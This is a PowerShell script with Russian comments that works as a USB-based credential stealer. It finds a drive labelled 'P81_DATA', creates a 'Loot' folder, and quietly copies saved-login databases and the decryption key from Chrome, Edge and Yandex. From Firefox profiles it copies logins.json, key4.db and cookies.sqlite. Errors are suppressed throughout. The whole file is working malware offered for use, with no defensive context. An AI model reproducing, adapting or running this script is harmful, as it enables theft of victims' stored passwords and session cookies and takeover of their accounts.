# 1. Поиск флешки
$usb = Get-Volume | Where-Object { $_.FileSystemLabel -eq "P81_DATA" } | Select-Object -ExpandProperty DriveLetter
if (!$usb) { exit }

# 2. Создание папки (название — время запуска)
$folderName = Get-Date -Format "HH_mm_ss"
$dest = "$($usb):\Loot\$folderName"
New-Item -ItemType Directory -Path $dest -Force | Out-Null

# 3. Сбор Chromium (Chrome, Edge, Yandex)
$browsers = @(
    @{n="Chrome"; p="Google\Chrome\User Data"},
    @{n="Edge"; p="Microsoft\Edge\User Data"},
    @{n="Yandex"; p="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $uPath = Join-Path $env:LOCALAPPDATA $b.p
    if (Test-Path $uPath) {
        # Копируем Local State (ключ)
        copy-item (Join-Path $uPath "Local State") -Destination "$dest\$($b.name)_LocalState" -ErrorAction SilentlyContinue
        
        # Копируем Login Data изо всех профилей
        Get-ChildItem -Path $uPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
            copy-item $_.FullName -Destination "$dest\$($b.name)_$($_.Directory.Name)_LoginData" -Force -ErrorAction SilentlyContinue
        }
    }
}

# 4. Сбор Firefox
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffPath) {
    Get-ChildItem -Path $ffPath -Directory | ForEach-Object {
        $p = $_.FullName
        copy-item (Join-Path $p "logins.json") -Destination "$dest\FF_$($_.Name)_logins.json" -ErrorAction SilentlyContinue
        copy-item (Join-Path $p "key4.db") -Destination "$dest\FF_$($_.Name)_key4.db" -ErrorAction SilentlyContinue
        copy-item (Join-Path $p "cert9.db") -Destination "$dest\FF_$($_.Name)_cert9.db" -ErrorAction SilentlyContinue
        copy-item (Join-Path $p "cookies.sqlite") -Destination "$dest\FF_$($_.Name)_cookies.sqlite" -ErrorAction SilentlyContinue
    }
}

exit
